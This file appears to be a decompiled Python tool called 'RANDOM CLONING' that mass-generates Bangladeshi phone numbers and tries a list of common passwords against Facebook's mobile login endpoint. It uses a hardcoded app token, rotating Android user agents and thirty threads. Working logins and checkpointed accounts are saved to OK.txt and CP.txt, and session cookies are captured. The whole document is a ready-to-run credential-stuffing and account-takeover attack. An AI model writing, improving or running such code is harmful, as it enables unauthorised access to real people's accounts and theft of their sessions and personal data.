# -*- coding: utf-8 -*-
# uncompyle6 version 3.9.1
# Python bytecode version base 3.11.0 (3534)
# Decompiled from: Python 3.11.9 (main, Apr  2 2024, 08:25:04) [Clang 15.0.0 (clang-1500.3.9.4)]
# Embedded file name: <string>
# Compiled at: 2024-05-18 10:48:33
# Size of source mod 2**32: 30043 bytes
import os, sys, time, datetime, random, hashlib, re, threading, json, requests, uuid, zlib, string
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
try:
    import mechanize
except ImportError:
    os.system("pip install mechanize")

try:
    import rich
except ImportError:
    os.system("pip install rich")

import requests
from rich.panel import Panel
from rich.console import Console
console = Console()
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as rprint
from rich.text import Text as tekz
from rich.console import Console as sol
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from time import localtime as lt
import bs4
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
from datetime import datetime
import time
start = time.time()
ua_android = ["Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-A426U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; LM-X320) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-G900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; LM-X320) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-G900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; LM-X320) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-G900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; LM-X320) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; LM-G900) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36"]

class Main:

    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        self.rcd = []
        os.system("clear")
        self.logo()
        self.main()

    def main(self):
        c = "*"
        d = "1.0"
        e = "7"
        f = c + d + e
        self.f = f
        cetak(
            nel(
                " [bold black][[white]1[bold black]][white]RANDOM CLONING\n[bold black][[white]0[bold black]][white]EXIT",
                title="[bold green]CHOOSE",
            )
        )
        ghx = input("   --> ")
        if ghx in ("1", "01"):
            self.rmenu1()
        else:
            if ghx in ("0", "00"):
                exit()
            else:
                cetak(
                    nel(
                        " [bold black][[white]*[bold black]][bold green]CHOOSE VALID OPTION",
                        style="bold red",
                    )
                )
                self.main()

    def rmenu1(self):
        os.system("clear")
        self.logo()
        cetak(
            nel(
                " [bold black][[white]*[bold black]][bold green]BD SIM CODE   [bold black]> [white]013 014 015 016 017 018 019",
                style="bold blue",
            )
        )
        line()
        code = input("   --> ")
        cetak(
            nel(
                " [bold black][[white]*[bold black]][bold green]EXAMPLE   [bold black]> [white]1000 5000 10000 15000 20000",
                style="bold blue",
            )
        )
        line()
        limit = int(input("   --> "))
        for x in range(limit):
            n = "".join(random.choice(string.digits) for _ in range(8))
            self.id.append(n)
        cetak(
            nel(
                " [bold black][[white]*[bold black]][bold green]DO YOU WENT SHOW CP ACCOUNT[bold black] ([white]y[bold black]/[white]n[bold black])",
                style="bold blue",
            )
        )
        line()
        ask = input("   --> ")
        if ask in ("Y", "y", "1"):
            self.id.append("showaps")
        else:
            if ask in ("N", "n", "2"):
                self.id.append("noaps")
            else:
                if ask in ("3", "03"):
                    self.main()
                else:
                    self.main()
        with tred(max_workers=30) as (tpb):
            os.system("clear")
            self.logo()
            self.paswrd()
            s = len(self.id)
            cetak(
                nel(
                    f" [bold black][[white]*[bold black]][bold green]TOTAL ID     [bold black]> [white]{s}\n [bold black][[white]*[bold black]][bold green]SIM CODE     [bold black]> [white]{code}\n [bold black][[white]*[bold black]][bold green]START TIME   [bold black]> [white]{z()}",
                    title=" [bold red]CLONING INFO",
                )
            )
            line()
            for user in self.id:
                if "showaps" == user:
                    pass
                else:
                    if "noaps" == user:
                        pass
                    else:
                        uid = code + user
                        pwx = [user, uid, "Bangladesh", "@1234@", "@12345@", "@#@#@#", "@#123456@#", "@@@###", "aabbcc", "aaabbb", "", "", "123456", "1234567", "708090", "mehedi", "mababa", "sadiya", "jannat12", "sabbir123", "@123456@", "&&&&&&", "112233", "444777", "sadiya@12", "sagor12", "sakib12", "sakib@12", "sakib1", "sakib@#", "sakib123", "sakib21", "sabbir12", "sabbir@#", "sabbir1", "sabbir#", "sabbir1234", "mamun12", "siam123", "sadik123", "evan12", "evan123", "siddik", "siddik123", "masum12", "masum123", "masum1122", "masud12", "masud1", "masud123", "sojib12", "sojib123", "sojib11", "pranto12", "pranto123", "pranto1122", "antor@@##", "antorkhan", "antor123", "Bangla", "bangla", "I LOVE YOU", "i love you", "###@@@", "sumaiya", "jannatul", "00998877", "113355", "", "sabbir", "abbuammu", "sumiya", "", "bangladesh"]
                        tpb.submit(self.graph, uid, pwx)
            line()
            cetak(nel(" [bold green]CLONING COMPLETE", title="[bold green]DONE"))
            print(f" TOTAL OK {len(self.ok)}")
            exit()

    def paswrd(self):
        pass

    def graph(self, uid, pwx):
        try:
            for ps in pwx:
                pro = random.choice(ua_android)
                adid = str(uuid.uuid4())
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": str(uuid.uuid4()),
                    "email": uid,
                    "password": ps,
                    "generate_analytics_claim": "1",
                    "community_id": "",
                    "cpl": "true",
                    "try_num": "1",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "password",
                    "source": "login",
                    "error_detail_type": "button_with_disabled",
                    "enroll_misauth": "false",
                    "generate_session_cookies": "1",
                    "generate_machine_id": "1",
                    "currently_logged_in_userid": "0",
                    "locale": "en_GB",
                    "client_country_code": "GB",
                    "fb_api_req_friendly_name": "authenticate",
                }
                head = {
                    "User-Agent": pro,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "X-FB-Friendly-Name": "authenticate",
                    "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": "unknown",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-FB-HTTP-Engine": "Liger",
                }
                url = "https://b-graph.facebook.com/auth/login"
                twf = requests.post(url, data=data, headers=head, allow_redirects=False).json()
                if "session_key" in twf:
                    print(f'\r\r [bold green][OK] {uid} | {ps}')
                    ckkk = ";".join(
                        (
                            key + "=" + value
                            for key, value in twf["session_cookies"].items()
                        )
                    )
                    self.ok.append(uid)
                    open("/sdcard/OK.txt", "a").write(uid + " | " + ps + "\n")
                else:
                    if "www.facebook.com" in twf["error"]["message"]:
                        if "showaps" == self.id[-1]:
                            print(f'\r\r [bold yellow][CP] {uid} | {ps}')
                            self.cp.append(uid)
                            open("CP.txt", "a").write(uid + " | " + ps + "\n")
        except:
            self.loop += 1

    def logo(self):
        c = "*"
        d = "1.0"
        e = "7"
        f = c + d + e
        self.f = f
        cetak(
            nel(
                " [bold red]* [bold green]* [bold yellow]*",
                title="<[bold white reverse] ROOT JAHID [/bold white reverse]>",
                subtitle=f"[bold green]VERSION {self.f}",
            )
        )
        cetak(
            nel(
                " [bold black][[white]*[bold black]][bold green] DEVELOPER   [bold black]> [white]ROOT JAHID \n[bold black][[white]*[bold black]][bold green] GITHUB      [bold black]> [white]ROOT JAHID XPLOIT \n[bold black][[white]*[bold black]][bold green] TOOL'S NAME [bold black]> [bold purple reverse] RANDOM CLONING",
                style="bold blue",
            )
        )

def z():
    z = datetime.now().strftime("%H:%M")
    return z

def line():
    console.print("--------------------------------------------------", style="bold hot_pink2")

if __name__ == "__main__":
    Main()